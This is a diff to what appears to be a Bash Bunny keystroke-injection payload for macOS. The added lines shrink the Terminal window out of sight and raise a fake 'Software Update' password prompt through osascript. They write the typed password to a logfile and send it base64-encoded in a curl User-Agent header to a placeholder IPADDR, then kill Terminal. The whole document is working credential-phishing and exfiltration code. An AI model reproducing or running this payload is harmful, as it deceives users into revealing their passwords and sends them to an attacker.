@@ -37,8 +37,14 @@ QUACK ENTER
 QUACK DELAY 200
 QUACK ENTER
 
+# Shrink window
+QUACK STRING osascript -e \'tell app \"Terminal\"\' -e \'set size of front window to {36, 36}' -e \'set position of front window to {0, 25}\' -e end\; 
+
+QUACK DELAY 200
+
 # Execute Payload
-QUACK STRING osascript -e \'tell app \"System Preferences\" to activate\' -e \'tell app \"System Preferences\" to activate\' -e \'tell app \"System Preferences\" to display dialog \"Software Update requires that you type your password to apply changes.\" \& return \& return  default answer \"\" with icon 1 with hidden answer with title \"Software Update\"\'\>/Volumes/BashBunny/$lootdir/phish/pw.txt\; sleep 20\; killall Terminal\;
+QUACK STRING osascript -e \'tell app \"System Preferences\" to activate\' -e \'tell app \"System Preferences\" to activate\' -e \'tell app \"System Preferences\" to display dialog \"Software Update requires that you type your password to apply changes.\" \& return \& return  default answer \"\" with icon 1 with hidden answer with title \"Software Update\"\'\>logfile\; curl -A \`base64 -i logfile\` IPADDR\; sleep 20\; killall Terminal\;
+
 QUACK ENTER
 QUACK DELAY 1000
 
